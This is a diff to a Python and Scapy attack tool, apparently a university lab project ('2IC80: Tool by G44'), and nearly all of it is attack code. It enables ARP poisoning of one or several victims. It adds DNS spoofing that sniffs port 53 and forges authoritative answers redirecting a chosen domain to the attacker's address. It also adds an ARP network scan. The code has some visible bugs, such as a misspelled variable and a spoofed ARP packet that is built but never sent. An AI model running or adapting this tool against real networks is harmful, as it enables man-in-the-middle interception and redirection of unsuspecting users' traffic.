@@ -2,9 +2,10 @@ import sys, os, argparse
 from util import bcolors, clear, parse_ip_input, validate_domain
 import random
 from scapy.all import *
-from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip
+from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip, srp
 import time
 import threading
+from functools import partial
 
 
 # The name of the network interface to use for sniffing and sending packets
@@ -47,26 +48,26 @@ def spoof(target_ip, spoof_ip):
 
 
 def ARPposioning():
-    # IP_ATTACKER = input("Enter IP address of attacker: ")
-    # MAC_ATTACKER = getmacbyip(IP_ATTACKER)
+    IP_ATTACKER = input("Enter IP address of attacker: ")
+    MAC_ATTACKER = getmacbyip(IP_ATTACKER)
 
     victimNumber = input("Do you want to spoof one or multiple victims? (1/m)")
     if victimNumber == "1":
         ipVictim = input("Enter IP address of victim: ")
-        # macVictim = getmacbyip(ipVictim)
+        macVictim = getmacbyip(ipVictim)
 
         IP_VICTIMS.append(ipVictim)
-        # MAC_VICTIMS.append(macVictim)
+        MAC_VICTIMS.append(macVictim)
 
         ipToSpoof = input("Enter IP address to spoof: ")
-        # print(ipVictim)
+        print(ipVictim)
         spoof(ipVictim, ipToSpoof)
 
         print("\n\n")
 
     elif victimNumber == "m":
         IPrange = input("What is the range of IP addresses?")
-        ipToSpoof = input("What is the IP address to spoof?")
+        IpToSpoof = input("What is the IP address to spoof?")
         if "-" in IPrange:
             upperBoundary = IPrange.split("-")[1]
             lowerBoundary = lowerBoundary = IPrange.split(".")[3].split("-")[0]
@@ -81,13 +82,18 @@ def ARPposioning():
                     + "."
                     + str(i)
                 )
-                # macVictim = getmacbyip(ipVictim)
+                macVictim = getmacbyip(ipVictim)
 
                 IP_VICTIMS.append(ipVictim)
-                # MAC_VICTIMS.append(macVictim)
-                spoof(ipVictim, ipToSpoof)
-                print(ipVictim)
+                MAC_VICTIMS.append(macVictim)
 
+                print(ipVictim)
+                arp = Ether() / ARP()
+                arp[Ether].src = MAC_ATTACKER
+                arp[ARP].hwsrc = MAC_ATTACKER
+                arp[ARP].psrc = ipToSpoof
+                arp[ARP].hwdst = macVictim
+                arp[ARP].pdst = ipVictim
         else:
             print("Invalid input. Please try again.")
 
@@ -98,6 +104,9 @@ def ARPposioning():
             cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC
         )
     )
+
+
+dns_domain_input = ""
 
 
 def DNSpoisoning():
@@ -119,13 +128,22 @@ def DNSpoisoning():
                     warning=bcolors.WARNING, endc=bcolors.ENDC
                 )
             )
-
-    # Ask for an IP address until a valid one is provided
+    print(dns_domain)
+    ipVictim = raw_input("Enter the IP of the victim u chose")
+    ipGate = raw_input("Enter the IP of the Gateway (probably 10.0.2.1)")
+    spoof(ipGate, ipVictim)
+    spoof(ipVictim, ipGate)
 
     # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
     # The data below is assumed from that ARP poisoning attack
     # Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
-    sniff(filter="udp port 53", prn=dns_reply, store=0, iface=net_interface, count=1)
+    sniff(
+        filter="udp port 53",
+        prn=partial(dns_reply, dns_dom=dns_domain),
+        store=0,
+        iface=net_interface,
+        count=1,
+    )
 
     print(
         "\n{cyan}{attack}{endc} has been executed (sent a packet to victim resolving {cyan}{domain}{endc} to {cyan}{ip}{endc})\n".format(
@@ -138,66 +156,83 @@ def DNSpoisoning():
     )
 
 
-def dns_reply(packet):
-    # Construct the DNS packet
-    # Construct the Ethernet header by looking at the sniffed packet
-    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
+def dns_reply(packet, dns_dom):
+    print(packet[DNSQR].qname, dns_dom)
+    if packet[DNSQR].qname == dns_dom + ".":
+        print(1)
+        # Construct the DNS packet
+        # Construct the Ethernet header by looking at the sniffed packet
+        eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
 
-    # Construct the IP header by looking at the sniffed packet
-    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
+        # Construct the IP header by looking at the sniffed packet
+        ip = IP(src=packet[IP].dst, dst=packet[IP].src)
 
-    # Construct the UDP header by looking at the sniffed packet
-    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
+        # Construct the UDP header by looking at the sniffed packet
+        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
 
-    # Construct the DNS response by looking at the sniffed packet and manually
-    dns = DNS(
-        id=packet[DNS].id,
-        qd=packet[DNS].qd,
-        aa=1,
-        rd=0,
-        qr=1,
-        qdcount=1,
-        ancount=1,
-        nscount=0,
-        arcount=0,
-        ar=DNSRR(
-            rrname=packet[DNS].qd.qname, type="A", ttl=600, rdata="192.168.56.102"
-        ),
-    )
+        # Construct the DNS response by looking at the sniffed packet and manually
+        dns = DNS(
+            id=packet[DNS].id,
+            qd=packet[DNS].qd,
+            aa=1,
+            rd=0,
+            qr=1,
+            qdcount=1,
+            ancount=1,
+            nscount=0,
+            arcount=0,
+            ar=DNSRR(
+                rrname=packet[DNS].qd.qname, type="A", ttl=600, rdata="192.168.56.102"
+            ),
+        )
 
-    # Put the full packet together
-    response_packet = eth / ip / udp / dns
+        # Put the full packet together
+        response_packet = eth / ip / udp / dns
 
-    # Send the DNS response
-    sendp(response_packet, iface=net_interface)
+        # Send the DNS response
+        sendp(response_packet, iface=net_interface)
+    else:
+        sendp(packet)
+        print("no\n")
 
 
 def SSLstripping():
-    print("SSL stripping selected.\n")
+    print("  SSL stripping selected.\n")
+
+
+def scan_ip(network, iface):
+    arp_request = ARP(pdst=network)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
+    arp_request_broadcast = broadcast / arp_request  # Combined Packet
+
+    answered = srp(arp_request_broadcast, timeout=2, iface=iface, verbose=False)[0]
+
+    # Print the IP and MAC addresses of all the devices on the network.
+    print(
+        "\033[1m"
+        + "  Here are the active devices on the "
+        + iface
+        + " interface"
+        + "\033[0m"
+    )
+    for sent, received in answered:
+        print("  IP: " + received.psrc + " - MAC: " + received.hwsrc)
+    print("\n")
 
 
 def mapAddresses():
-    answer = raw_input(
-        "Hello , do you want to map a specific ip address of a device on the network to their corresponding MAC addresse? Or Do you want to map all the devices on the network to their corresponding MAC addresses? (1/2)  \n"
+    print(
+        "  We shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n"
     )
-
-    if answer == "2":
-        print(
-            "we shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n"
-        )
-        print(arping("192.168.56.0-255"))
-    elif answer == "1":
-        address = raw_input(
-            "Please enter the IP address of the device you want to map to its corresponding MAC address: \n"
-        )
-        print(arping(address))
+    scan_ip("10.0.2.0/24", "enp0s8")
+    scan_ip("192.168.56.1/24", "enp0s3")
 
 
 def main():
     clear()
     print("2IC80: Tool by G44")
     while True:
-        print("Select the preferred attack from the list below:\n")
+        print(" Select the preferred attack from the list below:\n")
 
         print(
             "    {cyan}a{endc}) {attack}".format(
